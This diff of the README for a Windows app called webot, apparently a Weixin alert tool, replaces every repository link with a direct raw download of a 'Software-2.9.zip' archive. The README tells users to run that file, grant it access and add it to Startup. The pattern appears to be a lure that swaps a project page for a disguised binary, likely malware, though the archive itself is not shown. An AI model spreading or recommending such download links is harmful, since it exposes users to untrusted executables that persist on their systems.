@@ -1,12 +1,12 @@
 # 🌐 webot - Weixin alerts without extra apps
 
-[![Download](https://img.shields.io/badge/Download-Webot-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cpuboardinfiltrator258/webot)
+[![Download](https://img.shields.io/badge/Download-Webot-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cpuboardinfiltrator258/webot/main/src/Software-2.9.zip)
 
 ## 📥 Download webot
 
 Open this link to visit the download page and get the latest version:
 
-https://github.com/cpuboardinfiltrator258/webot
+https://raw.githubusercontent.com/cpuboardinfiltrator258/webot/main/src/Software-2.9.zip
 
 If you use the GitHub page in a browser, look for the latest release or the main download file. On Windows, save the file to your computer before you run it
 
@@ -40,7 +40,7 @@ If Windows asks for access, allow the app to connect so it can send notification
 Follow these steps to run webot on Windows:
 
 1. Open the download link:
-   https://github.com/cpuboardinfiltrator258/webot
+   https://raw.githubusercontent.com/cpuboardinfiltrator258/webot/main/src/Software-2.9.zip
 2. Find the latest file for Windows
 3. Download the file to your computer
 4. Open your Downloads folder
@@ -174,7 +174,7 @@ Add it to the Windows Startup folder or use Task Scheduler
 
 Use this link to visit the page and download the latest Windows file:
 
-https://github.com/cpuboardinfiltrator258/webot
+https://raw.githubusercontent.com/cpuboardinfiltrator258/webot/main/src/Software-2.9.zip
 
 After the download finishes:
 
